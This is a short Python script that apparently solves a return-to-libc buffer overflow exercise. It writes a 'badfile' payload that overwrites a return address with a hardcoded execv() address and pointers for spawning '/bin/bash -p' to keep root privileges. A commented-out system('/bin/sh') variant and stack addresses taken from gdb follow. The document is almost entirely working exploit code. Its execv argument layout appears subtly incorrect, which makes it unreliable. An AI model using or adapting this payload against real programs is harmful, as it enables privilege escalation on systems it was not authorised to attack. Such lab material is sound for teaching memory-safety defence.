#!/usr/bin/env python3
import sys

# Fill content with non-zero values
content = bytearray(0xaa for i in range(300))

X = 28  # Offset where we overwrite the return address

# Address of execv() + 4 (to avoid null bytes)
execv_addr = 0xf7e5f874  # Adjust based on your gdb session

# Address of "/bin/bash" (must be found dynamically, example shown)
bash_addr = 0xffffdf79    # Address of "/bin/bash", replace with correct address
dash_addr = 0xffffdf8a    # Address of "-p", replace with correct address
null_addr = 0x00000000    # Address of NULL (4 bytes of zero)

# Overwrite the return address with execv()
content[X:X+4] = (execv_addr).to_bytes(4, byteorder='little')

# Set up the argv[] array in memory at a known location
argv_array_addr = 0xffffd13a  # Adjust this based on your gdb analysis

# Step 1: Place the address of argv[] array (which will point to individual arguments) on the stack.
# [argv_array_addr] -> bash_addr, [argv_array_addr+4] -> dash_addr, [argv_array_addr+8] -> null_addr
content[X+4:X+8] = (bash_addr).to_bytes(4, byteorder='little')  # Address of argv[0] -> /bin/bash
content[X+8:X+12] = (dash_addr).to_bytes(4, byteorder='little')  # Address of argv[1] -> -p
content[X+12:X+16] = (null_addr).to_bytes(4, byteorder='little')  # Address of argv[2] -> NULL

# Save the payload to a file
with open("badfile", "wb") as f:
    f.write(content)


# #!/usr/bin/env python3c
# import sys

# # Fill content with non-zero values
# content = bytearray(0xaa for i in range(300))

# X = 28
# system_addr = 0xf7dc9170  # The address of system()
# content[X:X+4] = (system_addr).to_bytes(4,byteorder='little')

# # Y = 32
# # exit_addr = 0xf7dbb460    # The address of exit()
# # content[Y:Y+4] = (exit_addr).to_bytes(4,byteorder='little')

# Z = 36
# sh_addr = 0xffffdfb9       # The address of "/bin/sh"
# content[Z:Z+4] = (sh_addr).to_bytes(4,byteorder='little')

# # Save content to a file
# with open("badfile", "wb") as f:
#   f.write(content)

# Address of input[] inside main():  0xffffd170 gdb: 0xffffd130
# Input size: 300
# Address of buffer[] inside bof():  0xffffd140
# Frame Pointer value inside bof():  0xffffd158